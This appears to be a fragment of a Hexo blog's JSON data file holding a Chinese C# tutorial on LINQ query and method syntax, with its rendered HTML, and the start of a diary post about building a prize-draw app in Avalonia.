1, 2, 3, 4, 5, 6 };\n\n        // 使用 LINQ 查询语法\n        var evens = from n in numbers\n                    where n % 2 == 0\n                    select n;\n\n        Console.WriteLine(\"偶数有：\");\n        foreach (var n in evens)\n        {\n            Console.WriteLine(n);\n        }\n    }\n}\n```\n\n输出：\n\n```\n偶数有：\n2\n4\n6\n```\n\n这段代码看起来是不是有点像 SQL？\n\n```sql\nSELECT n FROM numbers WHERE n % 2 == 0;\n```\n\n\n **查询表达式语法（Query Syntax）**\n    LINQ 的语法参考了 SQL，例如 `from ... where ... select`，让 C# 程序员不用学习另一套 DSL，就能在代码里写“查询语句”。\n\n------\n\n## 2. 方法语法（Method Syntax）\n\n除了查询语法，LINQ 还有一种 **链式方法写法**，更贴近函数式编程。在C#中，LINQ 的方法语法使用了一系列扩展方法，这些方法定义在 `System.Linq` 命名空间中。(在C#里习惯称函数为方法。)\n\n```csharp\nusing System;\nusing System.Linq;\n\nclass Program\n{\n    static void Main()\n    {\n        string[] names = { \"Alice\", \"Bob\", \"Charlie\", \"David\" };\n\n        // 方法语法\n        var shortNames = names\n            .Where(n => n.Length <= 4)\n            .OrderBy(n => n.Length);\n\n        Console.WriteLine(\"名字长度 <= 4:\");\n        foreach (var name in shortNames)\n        {\n            Console.WriteLine(name);\n        }\n    }\n}\n```\n筛选名字长度 <= 4 的人,并按名字长度升序排序。  \n输出：\n\n```\n名字长度 <= 4:\nBob\nDave\n```\n\n------\n\n## 3. 常用操作\n\n| 操作符    | 功能                  | 示例                            |\n| --------- | --------------------- | ------------------------------- |\n| `Where`   | 过滤数据              | `list.Where(x => x > 10)`       |\n| `Select`  | 投影（选择字段）      | `list.Select(x => x.Name)`      |\n| `OrderBy` | 排序 (默认升序)       | `list.OrderBy(x => x.Age)`      |\n| `GroupBy` | 分组                  | `list.GroupBy(x => x.Category)` |\n| `Join`    | 连接（类似 SQL JOIN） | `list1.Join(list2, ...)`        |\n\n------\n\n## 4.数据库 查询\n\n如果你用 Entity Framework，LINQ 可以直接写 SQL 风格的查询：\n\n```csharp\nusing (var context = new MyDbContext())\n{\n    var students = from s in context.Students\n                   where s.Age > 18\n                   orderby s.Name\n                   select s;\n\n    foreach (var student in students)\n    {\n        Console.WriteLine($\"{student.Name} - {student.Age}\");\n    }\n}\n```\n\n这里的 `context.Students` 其实不是数组，而是 **IQueryable**，LINQ 会把表达式树翻译成 SQL：\n\n```sql\nSELECT [s].[Name], [s].[Age]\nFROM [Students] AS [s]\nWHERE [s].[Age] > 18\nORDER BY [s].[Name];\n```\n\n所以看起来就是 **“像写 SQL 一样写 C# 代码”**。\n\n------\n\n## 5. 总结\n\n- LINQ = 统一的查询语法，让你用一种写法查询不同数据源。\n- 它借鉴了 SQL 语法（`from / where / select`），看起来很像数据库操作。\n- 既能操作内存数据，也能查询数据库、XML、集合等。","slug":"Day 02 LINQ","published":1,"updated":"2025-09-24T10:00:44.253Z","_id":"cmfxt9ab2000040t894xibgtg","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"LINQ\"><a href=\"#LINQ\" class=\"headerlink\" title=\"LINQ\"></a>LINQ</h1><h2 id=\"1-什么是-LINQ？\"><a href=\"#1-什么是-LINQ？\" class=\"headerlink\" title=\"1. 什么是 LINQ？\"></a>1. 什么是 LINQ？</h2><p>LINQ（Language Integrated Query，语言集成查询）是 C# 3.0 引入的一种查询语法，它让你能用类似 SQL 的语法来操作集合（对象、数组、XML、数据库数据等）。正是因为LINQ可以像SQL一样操作数据库，所以也被人戏称为db(database)。<br> <strong>核心思想</strong>：用一种统一的方式查询不同的数据源。</p>\n<p>比如你要筛选一个数组中的偶数：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Linq;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">int</span>[] numbers = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 使用 LINQ 查询语法</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> evens = <span class=\"keyword\">from</span> n <span class=\"keyword\">in</span> numbers</span><br><span class=\"line\">                    <span class=\"keyword\">where</span> n % <span class=\"number\">2</span> == <span class=\"number\">0</span></span><br><span class=\"line\">                    <span class=\"keyword\">select</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;偶数有：&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> n <span class=\"keyword\">in</span> evens)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(n);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">偶数有：</span><br><span class=\"line\">2</span><br><span class=\"line\">4</span><br><span class=\"line\">6</span><br></pre></td></tr></table></figure>\n\n<p>这段代码看起来是不是有点像 SQL？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> n <span class=\"keyword\">FROM</span> numbers <span class=\"keyword\">WHERE</span> n <span class=\"operator\">%</span> <span class=\"number\">2</span> <span class=\"operator\">=</span><span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n\n\n<p> <strong>查询表达式语法（Query Syntax）</strong><br>    LINQ 的语法参考了 SQL，例如 <code>from ... where ... select</code>，让 C# 程序员不用学习另一套 DSL，就能在代码里写“查询语句”。</p>\n<hr>\n<h2 id=\"2-方法语法（Method-Syntax）\"><a href=\"#2-方法语法（Method-Syntax）\" class=\"headerlink\" title=\"2. 方法语法（Method Syntax）\"></a>2. 方法语法（Method Syntax）</h2><p>除了查询语法，LINQ 还有一种 <strong>链式方法写法</strong>，更贴近函数式编程。在C#中，LINQ 的方法语法使用了一系列扩展方法，这些方法定义在 <code>System.Linq</code> 命名空间中。(在C#里习惯称函数为方法。)</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Linq;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">string</span>[] names = &#123; <span class=\"string\">&quot;Alice&quot;</span>, <span class=\"string\">&quot;Bob&quot;</span>, <span class=\"string\">&quot;Charlie&quot;</span>, <span class=\"string\">&quot;David&quot;</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 方法语法</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> shortNames = names</span><br><span class=\"line\">            .Where(n =&gt; n.Length &lt;= <span class=\"number\">4</span>)</span><br><span class=\"line\">            .OrderBy(n =&gt; n.Length);</span><br><span class=\"line\"></span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;名字长度 &lt;= 4:&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> name <span class=\"keyword\">in</span> shortNames)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(name);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>筛选名字长度 &lt;&#x3D; 4 的人,并按名字长度升序排序。<br>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">名字长度 &lt;= 4:</span><br><span class=\"line\">Bob</span><br><span class=\"line\">Dave</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"3-常用操作\"><a href=\"#3-常用操作\" class=\"headerlink\" title=\"3. 常用操作\"></a>3. 常用操作</h2><table>\n<thead>\n<tr>\n<th>操作符</th>\n<th>功能</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Where</code></td>\n<td>过滤数据</td>\n<td><code>list.Where(x =&gt; x &gt; 10)</code></td>\n</tr>\n<tr>\n<td><code>Select</code></td>\n<td>投影（选择字段）</td>\n<td><code>list.Select(x =&gt; x.Name)</code></td>\n</tr>\n<tr>\n<td><code>OrderBy</code></td>\n<td>排序 (默认升序)</td>\n<td><code>list.OrderBy(x =&gt; x.Age)</code></td>\n</tr>\n<tr>\n<td><code>GroupBy</code></td>\n<td>分组</td>\n<td><code>list.GroupBy(x =&gt; x.Category)</code></td>\n</tr>\n<tr>\n<td><code>Join</code></td>\n<td>连接（类似 SQL JOIN）</td>\n<td><code>list1.Join(list2, ...)</code></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"4-数据库-查询\"><a href=\"#4-数据库-查询\" class=\"headerlink\" title=\"4.数据库 查询\"></a>4.数据库 查询</h2><p>如果你用 Entity Framework，LINQ 可以直接写 SQL 风格的查询：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> (<span class=\"keyword\">var</span> context = <span class=\"keyword\">new</span> MyDbContext())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> students = <span class=\"keyword\">from</span> s <span class=\"keyword\">in</span> context.Students</span><br><span class=\"line\">                   <span class=\"keyword\">where</span> s.Age &gt; <span class=\"number\">18</span></span><br><span class=\"line\">                   <span class=\"keyword\">orderby</span> s.Name</span><br><span class=\"line\">                   <span class=\"keyword\">select</span> s;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> student <span class=\"keyword\">in</span> students)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">$&quot;<span class=\"subst\">&#123;student.Name&#125;</span> - <span class=\"subst\">&#123;student.Age&#125;</span>&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 <code>context.Students</code> 其实不是数组，而是 <strong>IQueryable</strong>，LINQ 会把表达式树翻译成 SQL：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> [s].[Name], [s].[Age]</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> [Students] <span class=\"keyword\">AS</span> [s]</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> [s].[Age] <span class=\"operator\">&gt;</span> <span class=\"number\">18</span></span><br><span class=\"line\"><span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> [s].[Name];</span><br></pre></td></tr></table></figure>\n\n<p>所以看起来就是 <strong>“像写 SQL 一样写 C# 代码”</strong>。</p>\n<hr>\n<h2 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5. 总结\"></a>5. 总结</h2><ul>\n<li>LINQ &#x3D; 统一的查询语法，让你用一种写法查询不同数据源。</li>\n<li>它借鉴了 SQL 语法（<code>from / where / select</code>），看起来很像数据库操作。</li>\n<li>既能操作内存数据，也能查询数据库、XML、集合等。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"LINQ\"><a href=\"#LINQ\" class=\"headerlink\" title=\"LINQ\"></a>LINQ</h1><h2 id=\"1-什么是-LINQ？\"><a href=\"#1-什么是-LINQ？\" class=\"headerlink\" title=\"1. 什么是 LINQ？\"></a>1. 什么是 LINQ？</h2><p>LINQ（Language Integrated Query，语言集成查询）是 C# 3.0 引入的一种查询语法，它让你能用类似 SQL 的语法来操作集合（对象、数组、XML、数据库数据等）。正是因为LINQ可以像SQL一样操作数据库，所以也被人戏称为db(database)。<br> <strong>核心思想</strong>：用一种统一的方式查询不同的数据源。</p>\n<p>比如你要筛选一个数组中的偶数：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Linq;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">int</span>[] numbers = &#123; <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 使用 LINQ 查询语法</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> evens = <span class=\"keyword\">from</span> n <span class=\"keyword\">in</span> numbers</span><br><span class=\"line\">                    <span class=\"keyword\">where</span> n % <span class=\"number\">2</span> == <span class=\"number\">0</span></span><br><span class=\"line\">                    <span class=\"keyword\">select</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;偶数有：&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> n <span class=\"keyword\">in</span> evens)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(n);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">偶数有：</span><br><span class=\"line\">2</span><br><span class=\"line\">4</span><br><span class=\"line\">6</span><br></pre></td></tr></table></figure>\n\n<p>这段代码看起来是不是有点像 SQL？</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> n <span class=\"keyword\">FROM</span> numbers <span class=\"keyword\">WHERE</span> n <span class=\"operator\">%</span> <span class=\"number\">2</span> <span class=\"operator\">=</span><span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n\n\n<p> <strong>查询表达式语法（Query Syntax）</strong><br>    LINQ 的语法参考了 SQL，例如 <code>from ... where ... select</code>，让 C# 程序员不用学习另一套 DSL，就能在代码里写“查询语句”。</p>\n<hr>\n<h2 id=\"2-方法语法（Method-Syntax）\"><a href=\"#2-方法语法（Method-Syntax）\" class=\"headerlink\" title=\"2. 方法语法（Method Syntax）\"></a>2. 方法语法（Method Syntax）</h2><p>除了查询语法，LINQ 还有一种 <strong>链式方法写法</strong>，更贴近函数式编程。在C#中，LINQ 的方法语法使用了一系列扩展方法，这些方法定义在 <code>System.Linq</code> 命名空间中。(在C#里习惯称函数为方法。)</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Linq;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">string</span>[] names = &#123; <span class=\"string\">&quot;Alice&quot;</span>, <span class=\"string\">&quot;Bob&quot;</span>, <span class=\"string\">&quot;Charlie&quot;</span>, <span class=\"string\">&quot;David&quot;</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 方法语法</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> shortNames = names</span><br><span class=\"line\">            .Where(n =&gt; n.Length &lt;= <span class=\"number\">4</span>)</span><br><span class=\"line\">            .OrderBy(n =&gt; n.Length);</span><br><span class=\"line\"></span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;名字长度 &lt;= 4:&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> name <span class=\"keyword\">in</span> shortNames)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(name);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>筛选名字长度 &lt;&#x3D; 4 的人,并按名字长度升序排序。<br>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">名字长度 &lt;= 4:</span><br><span class=\"line\">Bob</span><br><span class=\"line\">Dave</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"3-常用操作\"><a href=\"#3-常用操作\" class=\"headerlink\" title=\"3. 常用操作\"></a>3. 常用操作</h2><table>\n<thead>\n<tr>\n<th>操作符</th>\n<th>功能</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>Where</code></td>\n<td>过滤数据</td>\n<td><code>list.Where(x =&gt; x &gt; 10)</code></td>\n</tr>\n<tr>\n<td><code>Select</code></td>\n<td>投影（选择字段）</td>\n<td><code>list.Select(x =&gt; x.Name)</code></td>\n</tr>\n<tr>\n<td><code>OrderBy</code></td>\n<td>排序 (默认升序)</td>\n<td><code>list.OrderBy(x =&gt; x.Age)</code></td>\n</tr>\n<tr>\n<td><code>GroupBy</code></td>\n<td>分组</td>\n<td><code>list.GroupBy(x =&gt; x.Category)</code></td>\n</tr>\n<tr>\n<td><code>Join</code></td>\n<td>连接（类似 SQL JOIN）</td>\n<td><code>list1.Join(list2, ...)</code></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"4-数据库-查询\"><a href=\"#4-数据库-查询\" class=\"headerlink\" title=\"4.数据库 查询\"></a>4.数据库 查询</h2><p>如果你用 Entity Framework，LINQ 可以直接写 SQL 风格的查询：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> (<span class=\"keyword\">var</span> context = <span class=\"keyword\">new</span> MyDbContext())</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> students = <span class=\"keyword\">from</span> s <span class=\"keyword\">in</span> context.Students</span><br><span class=\"line\">                   <span class=\"keyword\">where</span> s.Age &gt; <span class=\"number\">18</span></span><br><span class=\"line\">                   <span class=\"keyword\">orderby</span> s.Name</span><br><span class=\"line\">                   <span class=\"keyword\">select</span> s;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> student <span class=\"keyword\">in</span> students)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">$&quot;<span class=\"subst\">&#123;student.Name&#125;</span> - <span class=\"subst\">&#123;student.Age&#125;</span>&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 <code>context.Students</code> 其实不是数组，而是 <strong>IQueryable</strong>，LINQ 会把表达式树翻译成 SQL：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> [s].[Name], [s].[Age]</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> [Students] <span class=\"keyword\">AS</span> [s]</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> [s].[Age] <span class=\"operator\">&gt;</span> <span class=\"number\">18</span></span><br><span class=\"line\"><span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> [s].[Name];</span><br></pre></td></tr></table></figure>\n\n<p>所以看起来就是 <strong>“像写 SQL 一样写 C# 代码”</strong>。</p>\n<hr>\n<h2 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5. 总结\"></a>5. 总结</h2><ul>\n<li>LINQ &#x3D; 统一的查询语法，让你用一种写法查询不同数据源。</li>\n<li>它借鉴了 SQL 语法（<code>from / where / select</code>），看起来很像数据库操作。</li>\n<li>既能操作内存数据，也能查询数据库、XML、集合等。</li>\n</ul>\n"},{"title":"流水账-Avalonia","date":"2025-09-26T16:00:00.000Z","top_img":"/images/background/狐妖/04.jpg","cover":"/images/background/狐妖/0.jpg","_content":"\n# 流水账-Avalonia\n\n> 近几天尝试用`Avalonia`搞了一个`Draw`(~~也算是借鉴🦊佬的学习路线了~~),但是非常悲伤的是没有设计出MVVM的架构，~~仅是MV架构就要我半条命~~，ViewModel层拼尽全力不知道该填些什么...小记一下我的折腾。\n\n## Model层\n\n没有高端的玩意儿，总而言之就是💩山，只有最最最基础的`class`，没有`record`、`dictionary`那些🥹，用不惯喵。我甚至把所有类都塞到了一个`.cs`文件里,不过能跑就⭐（×），唉唉，不管了。    \n\n我设计了四个类，`Prize`、`Participant`、`DrawResult`、`DrawManager`，分别用来放奖项信息、参与者信息、抽奖结果和抽奖发起者的行为。\n\n前三个类存放相关信息，当然也要支持修改，支持读取，所以均使用`{get;set;}`访问控制器。\n\n至于抽奖发起者，一个最重要的行为就是要组织开奖，也就是获取`DrawWinners()`的行为，而获奖者一般也不止一个，所以我选用了`List`,也就封装出了`public List<DrawResult> DrawWinners()`这个函数。接下来细想一下，这个函数需要哪些实现逻辑呢？\n\n- 首先需要获取参与者信息\n- 当然也需要获取奖项设立的情况\n- 抽奖的随机性也是必须的\n- 最后还要及时删除参与者的数据，避免重复抽奖\n\n如下：\n\n```c#\npublic List<DrawResult> DrawWinners()\n{\n    var results = new List<DrawResult>();\n    var availableParticipants = _participants.ToList();\n\n    // 如果没有参与者，返回空结果\n    if (availableParticipants.Count == 0)\n    {\n        return results;\n    }\n\n    foreach (var prize in _prizes)\n    {\n        // 计算实际抽奖数量：取奖项数量和剩余参与者数量的较小值\n        int actualQuantity = Math.Min(prize.Quantity, availableParticipants.Count);\n        \n        for (int i = 0; i < actualQuantity && availableParticipants.Count > 0; i++)\n        {\n            var randomIndex = _random.Next(availableParticipants.Count);\n            var winner = availableParticipants[randomIndex];\n            \n            results.Add(new DrawResult\n            {\n                WinnerName = winner.Name,\n                Prize = prize,\n                DrawTime = DateTime.Now\n            });\n\n            availableParticipants.RemoveAt(randomIndex);\n        }\n    }\n\n    _results.AddRange(results);\n    return results;\n}\n```\n\n以上就是抽奖的实现逻辑，此外，值得一提的是`readonly`关键字的使用，\n\n1.\n\n```c#\nprivate readonly List<Participant> _participants = new();\n```\n\n这是private封装（内部只读存储），`readonly`使它不能被重新赋值（例如不能再 `_participants = new List<...>()`），但**可以修改集合内部的元素**（如 `_participants.Add(...)`），这就可以很好地支持了操作部分参与者的需求。\n\n2.\n\n```c#\npublic ReadOnlyCollection<Participant> Participants => _participants.AsReadOnly();\n```\n\n这也是封装（readonly只读保护），给外部提供的`readonly`只读访问接口，支持获取参与者信息，也保护了数据不被外部删改。\n\n## View层\n\nView视图的UI设计(`.axaml`)和事件绑定(`.axaml.cs`)相关的数据交互我都放在了这一层处理。\n\n关于UI设计等我过几天再补吧，太累了，先不写了（\n\n\n\n## 从`.csproj`到`.exe`\n\n在这一步我也走了很多的弯路，最后也是在拷打`llm`各AI大模型下完成了这最后一步。~~总而言之，能跑就是win!~~\n\n\n\n## Keep Ongoing\n\n👆🏼\n","source":"_posts/Csharp流水账-Avalonia.md","raw":"---\ntitle: 流水账-Avalonia\ndate: 2025-09-27\ntags: Avalonia\ncategories: Csharp\ntop_img: /images/background/狐妖/04.jpg\ncover: /images/background/狐妖/0.jpg\n---\n\n# 流水账-Avalonia\n\n> 近几天尝试用`Avalonia`搞了一个`Draw`(~~也算是借鉴🦊佬的学习路线了~~),但是非常悲伤的是没有设计出MVVM的架构，~~仅是MV架构就要我半条命~~，ViewModel层拼尽全力不知道该填些什么...小记一下我的折腾。\n\n## Model层\n\n没有高端的玩意儿，总而言之就是💩山，只有最最最基础的`class`，没有`record`、`dictionary`那些🥹，用不惯喵。我甚至把所有类都塞到了一个`.cs`文件里,不过能跑就⭐（×），唉唉，不管了。    \n\n我设计了四个类，`Prize`、`Participant`、`DrawResult`、`DrawManager`，分别用来放奖项信息、参与者信息、抽奖结果和抽奖发起者的行为。\n\n前三个类存放相关信息，当然也要支持修改，支持读取，所以均使用`{get;set;}`访问控制器。\n\n至于抽奖发起者，一个最重要的行为就是要组织开奖，也就是获取`DrawWinners()`的行为，而获奖者一般也不止一个，所以我选用了`List`,也就封装出了`public List<DrawResult> DrawWinners()`这个函数。接下来细想一下，这个函数需要哪些实现逻辑呢？\n\n- 首先需要获取参与者信息\n- 当然也需要获取奖项设立的情况\n- 抽奖的随机性也是必须的\n- 